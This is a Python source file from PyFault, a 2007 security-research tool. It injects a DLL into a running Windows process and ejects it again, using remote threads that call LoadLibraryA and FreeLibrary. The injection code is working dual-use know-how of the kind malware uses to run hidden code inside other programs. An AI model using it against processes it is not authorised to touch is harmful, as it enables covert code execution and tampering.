#
# PyFault
# Copyright (C) 2007 Justin Seitz <jms@bughunter.ca>
#
#
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public
# License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later
# version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free
# Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
#

import pyfault_defines
import faultx
import ctypes


kernel32 = ctypes.windll.kernel32


class pyfault:
    
    '''
    This class is mainly a DLL injector/ejector, but I hope to expand it to be a fault injection suite,
    to torture software on those days the elusive 0-day doesn't come knocking. For now inject
    away until I have time to code up some other lovin'
    '''
    
    def __init__ (self):
       
        self.dll_path        =    None        # Full path to DLL for injection.
        self.pid             =    None        # Process id for various nastiness. Mainly DLL injection.
    
    
    ##############################################################################
    '''
    This function is basically a nice wrapper around CreateToolhelp32Snapshot() to retrieve detailed
    information on a DLL for use in ejection.
    '''
    ##############################################################################
    
    def get_module_info(self,dll_name,pid):
        
        # http://msdn2.microsoft.com/en-us/library/ms686849.aspx Reference to iterating a module list for a process
        # As well its worth noting that PaiMei (http://paimei.openrce.org) by Pedram Amini
        # has a reference to this functionality somewhat. Original credit in the PaiMei framework
        # goes to Otto Ebeling.
        
        # We create a snapshot of the current process, this let's us dig out all kinds of 
        # useful information, including DLL info. We are really after the reference count
        # so that we can decrement it enough to get rid of the DLL we want unmapped
        current_process = pyfault_defines.MODULEENTRY32()
        h_snap = kernel32.CreateToolhelp32Snapshot(pyfault_defines.TH32CS_SNAPMODULE,pid)

        # check for a failure to create a valid snapshot
        if h_snap == pyfault_defines.INVALID_HANDLE_VALUE:
            raise faultx("CreateToolHelp32Snapshot(TH32CS_SNAPMODULE,%d) failed." % pid)
            
        # we have to initiliaze the size of the MODULEENTRY32 struct or this will all fail
        current_process.dwSize = ctypes.sizeof(current_process)
        
        # check to make sure we have a valid list
        if not kernel32.Module32First(h_snap, ctypes.byref(current_process)):
            raise faultx("Couldn't find a valid reference to the module %s" % dll_name)
            
        
        # Keep looking through the loaded modules to try to find the one specified for ejection
        while current_process.szModule.lower() != dll_name.lower():
            
            if not kernel32.Module32Next(h_snap, ctypes.byref(current_process)):
                raise faultx("Couldn't find the DLL %s" % dll_name)
               
        
        # close the handle to the snapshot
        kernel32.CloseHandle(h_snap)
        
        # return the MODULEENTRY32 structure of our DLL
        return current_process
    
    
    
    ##############################################################################
    '''
    This function removes a DLL from a running process, use at your own RISK! :)
    '''
    ##############################################################################
    
    def eject_dll(self,dll_name,pid):
        '''
        Eject a loaded DLL from a running process.
        @type    dll_name:    String
        @param   dll_name:    The name of the DLL you wish to eject.
        @type    pid:         Integer
        @param   pid:         The process ID that you want to eject a DLL from.
        
        @returns              True if successful, False if not.
        '''
        
        # We need to get the reference count, and the base address to pop the DLL out
        current_process = self.get_module_info(dll_name,pid)    
        
        if current_process != False:
            
            # Crack open the process
            h_process = kernel32.OpenProcess(pyfault_defines.PROCESS_ALL_ACCESS, False, pid)
               
            # Get a handle directly to kernel32.dll
            h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
            
            # Get the address of FreeLibrary
            h_freelib = kernel32.GetProcAddress(h_kernel32,"FreeLibrary")
                
            # Now we try to create the remote thread hopefully freeing that DLL, the reason we loop is that
            # FreeLibrary merely decrements the reference count of the DLL we are freeing. Once the ref count
            # hits 0 it will unmap the DLL from memory
            count = 0
            while count <= current_process.GlblcntUsage:
                thread_id = ctypes.c_ulong()
                if not kernel32.CreateRemoteThread(h_process,None,0,h_freelib,current_process.hModule,0,ctypes.byref(thread_id)):
                    raise faultx("CreateRemoteThread failed, couldn't run FreeLibrary()")
                count += 1
            
            # Free some handles so we aren't leaking them all over the floor
            kernel32.CloseHandle(h_process)
            kernel32.CloseHandle(h_kernel32)
            kernel32.CloseHandle(h_freelib)     
             
            return True
        
        else:
            
            return False
        
        
    ##############################################################################
    '''
    This is a simple method for injecting a DLL into a running process. 
    '''
    ##############################################################################
    
    def inject_dll(self,dll_path,pid):
        
        '''
        Inject a DLL of your choice into a running process.
        @type    dll_name:    String
        @param   dll_name:    The path to the DLL you wish to inject.
        @type    pid:         Integer
        @param   pid:         The process ID that you wish to inject into.
        
        @returns              True if the DLL was injected successfully, False if it wasn't.
        '''
        
        dll_len = len(dll_path)
        
        # Get a handle to the process we are injecting into.
        h_process = kernel32.OpenProcess(pyfault_defines.PROCESS_ALL_ACCESS, False, pid)
      
        # Now we have to allocate enough bytes for the name and path of our DLL.
        arg_address = kernel32.VirtualAllocEx(h_process,0,dll_len,pyfault_defines.VIRTUAL_MEM,pyfault_defines.PAGE_READWRITE)
      
        # Write the path of the DLL into the previously allocated space. The pointer returned
        written = ctypes.c_int(0)
        kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, ctypes.byref(written))
       
        # Get a handle directly to kernel32.dll
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        
        # Get the address of LoadLibraryA
        h_loadlib = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")
                
        # Now we try to create the remote thread, with the entry point of 
        thread_id = ctypes.c_ulong(0)
        if not kernel32.CreateRemoteThread(h_process,None,0,h_loadlib,arg_address,0,ctypes.byref(thread_id)):
            raise faultx("CreateRemoteThread failed, unable to inject the DLL.")
        
        # Return the threadid of the newly injected DLL 
        return True
                
 
